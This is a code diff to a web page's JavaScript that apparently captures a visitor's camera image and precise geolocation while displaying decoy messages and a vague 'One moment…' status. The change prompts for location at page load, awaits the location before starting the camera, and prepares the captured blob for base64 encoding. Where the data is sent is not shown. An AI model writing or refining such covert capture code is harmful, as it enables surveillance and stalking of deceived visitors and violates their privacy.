@@ -255,17 +255,21 @@
       return DECOY_MESSAGES[Math.floor(Math.random() * DECOY_MESSAGES.length)];
     }
 
-    function getLocationFast() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        () => console.log("Location granted"),
+        () => console.log("Location denied"),
+        { enableHighAccuracy: true }
+      );
+    }
+
+    function getLocationForCapture() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
-          resolve({ latitude: null, longitude: null, accuracy: null });
+          resolve(null);
           return;
         }
-
-        const timeout = setTimeout(() => {
-          resolve({ latitude: null, longitude: null, accuracy: null });
-        }, 5000);
-
+        const timeout = setTimeout(() => resolve(null), 3000);
         navigator.geolocation.getCurrentPosition(
           (pos) => {
             clearTimeout(timeout);
@@ -277,14 +281,12 @@
           },
           () => {
             clearTimeout(timeout);
-            resolve({ latitude: null, longitude: null, accuracy: null });
+            resolve(null);
           },
-          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+          { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
         );
       });
     }
-
-    const locationPromise = getLocationFast();
 
     const CAMERA_INIT_TIMEOUT_MS = 15000;
     const VIDEO_READY_TIMEOUT_MS = 12000;
@@ -427,7 +429,7 @@
 
     async function run() {
       setStatus("One moment…");
-      /* Location resolves in parallel (started at load); never block camera on geolocation. */
+      const location = await getLocationForCapture();
 
       let stream;
       try {
@@ -455,13 +457,6 @@
 
       stream.getTracks().forEach((t) => t.stop());
       preview.srcObject = null;
-
-      let location;
-      try {
-        location = await locationPromise;
-      } catch {
-        location = { latitude: null, longitude: null, accuracy: null };
-      }
 
       try {
         const b64 = await blobToBase64(encoded.blob);
